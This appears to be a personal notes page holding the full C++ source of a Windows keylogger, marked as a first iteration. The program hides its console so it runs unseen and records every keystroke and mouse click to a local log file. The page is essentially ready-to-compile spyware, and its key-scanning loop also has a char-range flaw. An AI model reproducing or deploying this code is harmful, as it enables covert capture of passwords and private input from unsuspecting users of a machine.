**Title:** ILY - Keylogger - Code
**Tags:** [[ILY - Keylogger]]
**Topics:** 

---
# ILY - Keylogger - Code
# First Iteration
```c++
#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

/**
 *  @brief Appends a string to the log file.
 * 
 * @pre The string is an acronym of a special character or a character.
 * @post The log file has the new input appended.
 */
void save(const string& input) {
    fstream LogFile;
    
    LogFile.open("log.txt", fstream::app);  // If it does not exists, it will create it.
    
    if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

/**
 * @brief Checks if the given ASCII value corresponds to a special key and logs it.
 *  
 * @pre A valid ASCII value is passed to the function.
 * @post If the key is special, it is logged to the log file and returns "True". "False" otherwise and not logged.
 */
bool specialKey(char key) {
    switch (key) {
        case VK_SPACE:
            save(" ");
            return true;
        case VK_RETURN:
            save("\n");
            return true;
        case VK_SHIFT:
            save("[SHIFT]");
            return true;
        case VK_BACK:
            save("[BACKSPACE]");
            return true;
        case VK_RBUTTON:
            save("[R_CLICK]");
            return true;
        case VK_LBUTTON:
            save("[L_CLICK]");
            return true;
        case VK_CAPITAL:
            save("[CAPS_LOCK]");
            return true;
        case VK_TAB:
            save("[TAB]");
            return true;
        case VK_UP:
            save("[UP_ARROW_KEY]");
            return true;
        case VK_DOWN:
            save("[DOWN_ARROW_KEY]");
            return true;
        case VK_LEFT:
            save("[LEFT_ARROW_KEY]");
            return true;
        case VK_RIGHT:
            save("[RIGHT_ARROW_KEY]");
            return true;
        case VK_CONTROL:
            save("[CONTROL]");
            return true;
        case VK_MENU:
            save("[ALT]");
            return true;
        default:
            return false;
    }
}

/**
 * @brief Logs every key that the user presses to a logfile.
 * 
 * @pre The function assumes it is running in a Windows environment with access to the console and file system.
 * @post All key presses are logged to "log.txt" until the process is terminated.
 */
void startLogging() {
    // Hide console while executing the program. We want to be invisible !!
    // To stop the process: taskkill /IM keylogger.exe /F
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    while (true) {
        Sleep(10);  // Avoid excessive CPU usage
        
        for (char key = 8; key<=222; key++) {
            // NOTE: The "if" condition is explained in this keylogger documentation.
            if (GetAsyncKeyState(key) == 0xFFFF8001) {  // If a key has been pressed and released
                if (not specialKey(key)) {
                    string str(1, key);  // Transforms the key into character
                    save(str);  // Logs the key
                }
            }
        }
    }
}

int main() {
    startLogging();
    
    return 0;
}
```